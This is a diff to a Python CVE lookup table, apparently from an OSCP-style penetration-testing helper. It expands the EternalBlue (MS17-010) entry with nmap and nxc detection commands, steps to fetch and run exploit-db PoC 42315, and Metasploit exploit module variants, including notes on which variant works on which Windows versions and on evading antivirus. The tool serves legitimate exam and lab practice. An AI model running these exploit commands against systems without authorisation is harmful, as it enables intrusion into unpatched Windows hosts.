@@ -64,8 +64,8 @@ CVE_DATABASE: List[Dict[str, Any]] = [
     # ------------------------------------------------------------------ #
     {
         "id": "CVE-2017-0144",
-        "name": "EternalBlue (MS17-010)",
-        "affected": "Windows SMBv1 — Win7/2008R2/Win8.1/2012R2 (unpatched)",
+        "name": "EternalBlue / EternalRomance / EternalSynergy / EternalChampion (MS17-010)",
+        "affected": "Windows SMBv1 — Win7/2008R2/Win8.1/2012R2/Win10<1703 (unpatched)",
         "severity": "CRITICAL",
         "detection": {
             "port": 445,
@@ -74,16 +74,31 @@ CVE_DATABASE: List[Dict[str, Any]] = [
             "service_keyword": "microsoft-ds",
         },
         "manual_exploit": [
+            "# Detection:",
             "nmap -p445 --script smb-vuln-ms17-010 {ip}",
-            "# Standalone PoC (no MSF):",
+            "nxc smb {ip} -u '' -p '' -M ms17-010",
+            "# Standalone PoC (EternalBlue, no MSF quota):",
             "searchsploit -m 42315",
             "python3 42315.py {ip}",
             "# AutoBlue alternative: https://github.com/3ndG4me/AutoBlue-MS17-010",
+            "# MSF — EternalBlue (Win7 / 2008R2, most reliable):",
             "[MSF-RESTRICTED] use exploit/windows/smb/ms17_010_eternalblue",
+            "# MSF — EternalRomance / EternalSynergy / EternalChampion (Win8.1 / 2012R2 where EternalBlue often fails):",
+            "[MSF-RESTRICTED] use exploit/windows/smb/ms17_010_psexec",
+            "# MSF — no-payload command exec variant (useful when AV strips meterpreter):",
+            "[MSF-RESTRICTED] use exploit/windows/smb/ms17_010_command",
+            "# MSF — auxiliary detection scanner (non-exploit, safe for scope-limited assessments):",
+            "auxiliary/scanner/smb/smb_ms17_010",
         ],
         "searchsploit_id": "42315",
         "msf_module": "exploit/windows/smb/ms17_010_eternalblue",
-        "oscp_note": "Classic OSCP lab staple. Prefer standalone PoC — MSF limited to 1 machine.",
+        "msf_variants": [
+            "exploit/windows/smb/ms17_010_psexec",
+            "exploit/windows/smb/ms17_010_command",
+            "auxiliary/scanner/smb/smb_ms17_010",
+        ],
+        "oscp_note": "Classic OSCP lab staple. Prefer standalone PoC — MSF limited to 1 machine. "
+                     "Use psexec/command variants on Win8.1/2012R2 where vanilla EternalBlue BSODs.",
         "references": [
             "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010",
             "https://www.exploit-db.com/exploits/42315",
